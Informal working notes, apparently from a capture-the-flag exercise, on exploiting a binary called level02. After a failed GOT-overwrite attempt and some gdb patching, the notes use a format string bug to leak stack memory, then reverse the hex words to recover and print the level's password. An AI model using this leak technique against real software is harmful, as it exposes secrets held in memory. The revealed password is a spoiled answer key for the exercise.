#1st tests

ok we cant make it overflow for 1 thing

then there is a strcspn that will use offset of the user name to put 0x0 somewhere on stack
maybe we can play with this

ok upon further reading we should not see the string coz we wouldnt have rights to do this, but dirtycow

But there seems to be a format string vuln on the last printf of main, which could be used to rewrite
exit got table entry to redirect code exec at line 625 and hit win cond

somehow doesnt work, lets check if i take control of good param

ok looks like there is some kind of trick for this format string vuln, 
i can control 27th param but not the 28th, wtf?? + cant expose stack forever coz limitation on the
size of fgets to 100chars, cf asm

should not be a problem tho
we should put address got exit + padd x0601228 - 4 pr got +

we have prob segfault in gdb doesnt finish printf.
Lets try one more time.

Ok cant use format string vuln, i dont know why the printf crashes with my input script

#2nd tests without format string

lets try sth else

we create a file with a 41 chars string in /tmp
then break *main+148
run program then
set  {char [10]}0x400bb2="/tmp/fpass". This way we change the file to fopen and can continue
prgm execution without any problem.

then we can see that if the result of fread for the file precedently opened doesnt equal 41 | 0x29
we exit, so we have to make sure fpass is a string 41 long.

We can then hit the line main+591
We know that if the strncmp of 29  from our fread and our input pass match, we can run the call to
system bin/sh and pass the level. Dang cant access password this way..

can we combine both ideas? no cause printf vulnerable is after the call to fopen

ok so there is no code execution to bypass here, the solution was in front of my eyes since the beginning
the thing is we can print stack, which is already an exploit in itself
Without the use of gdb the level2 does open the file and stores on the stack the password red
So if we use a hex to string converter on internet we can see P47hHas9QWNgXnGXsfK9M
roaming around on stack. It looks like a password. The thing is since params are pused on stack on little endiant the converter wont read the password in the good order

so for(( i = 1; i < 42; i++)); do echo "$i - %$i\$p" | ./level02 will give us 4i outputs of level02 with input of shape "1 - %1$p"

then 
`
22 - 0x756e505234376848 does not have access! ==> unPR47hH : once reversed ==> Hh74RPnu
23 - 0x45414a3561733951 does not have access! ==> EAJ5as9Q : once reversed ==> Q9sa5JAE
24 - 0x377a7143574e6758 does not have access! ==> 7zqCWNgX : once reversed ==> XgNWCqz7
25 - 0x354a35686e475873 does not have access! ==> 5J5hnGXs : once reversed ==> sXGnh5J5
26 - 0x48336750664b394d does not have access! ==> H3gPfK9M : once reversed ==> M9KfPg3H
`
gives once translated. But as such we dont respect endianness, so we have to use a python trick to read the string backwards

p3 -c 'print(bytes.fromhex("756e505234376848").decode("utf-8")[::-1])'

python doc strings : `list[<start>:<stop>:<step>]` ==> [::-1] reverses string.

so once reversed we can cat these 5 strings and get the password

./level02
username = any
password = Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
